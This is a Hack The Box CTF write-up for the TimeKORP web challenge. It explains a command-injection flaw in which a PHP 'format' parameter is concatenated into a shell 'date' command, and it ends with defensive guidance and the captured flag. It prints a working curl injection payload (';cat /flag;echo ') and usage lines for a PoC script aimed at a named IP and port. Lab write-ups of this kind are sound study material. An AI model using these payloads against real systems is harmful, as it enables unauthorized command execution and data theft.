# TimeKORP (Hack The Box) - Professional PoC Writeup

## Challenge Profile

| Field | Value |
|---|---|
| Challenge | TimeKORP |
| Category | Web |
| Primary dropped file | `web_timecorp (1).zip` |
| Existing local writeup/PoC | Present |
| Core bug class | Command injection |

## Scope And Ethics

This material is for authorized CTF infrastructure only. Do not run this PoC
against systems you do not own or have explicit permission to test.

## Technical Summary

The application accepts a `format` query parameter and concatenates it into a
shell command:

```php
$this->command = "date '+" . $format . "' 2>&1";
```

Because user input is embedded in a quoted shell string, injecting a single
quote (`'`) breaks out of the intended context and allows arbitrary command
execution. Reading `/flag` returns the challenge flag in the HTTP response.

## Vulnerable Behavior

1. Untrusted input is concatenated into a shell command string.
2. Single-quote context is attacker-controllable.
3. No escaping or safe argument handling is applied.
4. Command output is reflected in page response.

## Manual Verification Steps

1. Confirm normal endpoint behavior:

```bash
curl -s 'http://<HOST>:<PORT>/?format=%25H:%25M:%25S'
```

2. Trigger command injection:

```bash
curl -s 'http://<HOST>:<PORT>/?format=%27%3Bcat%20/flag%3Becho%20%27'
```

3. Decoded payload used:

```text
';cat /flag;echo '
```

4. Extract `HTB{...}` from response body.

## Automated PoC

Script:
`timekorp_poc.sh`

### Usage

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/TimeKORP"
chmod +x timekorp_poc.sh
./timekorp_poc.sh <host> <port>
```

### Common examples

```bash
./timekorp_poc.sh 154.57.164.71 31625
./timekorp_poc.sh --host 154.57.164.71 --port 31625 --verbose
./timekorp_poc.sh --host 154.57.164.71 --port 31625 --json
```

## Options

- `--host <host>`: target host or IP.
- `--port <port>`: target TCP port.
- `--payload <value>`: injection payload for `format`.
- `--timeout <seconds>`: HTTP timeout, default `15`.
- `--json`: machine-readable JSON output.
- `--verbose`: print debug details.
- `-h`, `--help`: show usage help.

## Exit Codes

- `0`: exploit succeeded and flag extracted.
- `2`: invalid CLI arguments.
- `3`: connectivity/request failure.
- `4`: flag not found in response.

## Why The Exploit Works

- Shell command construction uses string concatenation.
- Payload terminates quoted format argument.
- Additional shell command (`cat /flag`) executes in same process context.
- App response includes command output.

## Defensive Guidance

- Avoid shell invocation for date formatting logic.
- Use native language APIs for time/date output.
- If shell execution is unavoidable, pass strict allowlisted formats only.
- Never interpolate raw user input into command strings.

## Result Note

Flag values are instance-specific. The format remains `HTB{...}`.

## Final Flag

Target instance: `154.57.164.71:31625`  
Solved on: `2026-04-02`  
Flag: `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_32116e56fba2d379b8fc48cff98bce57}`
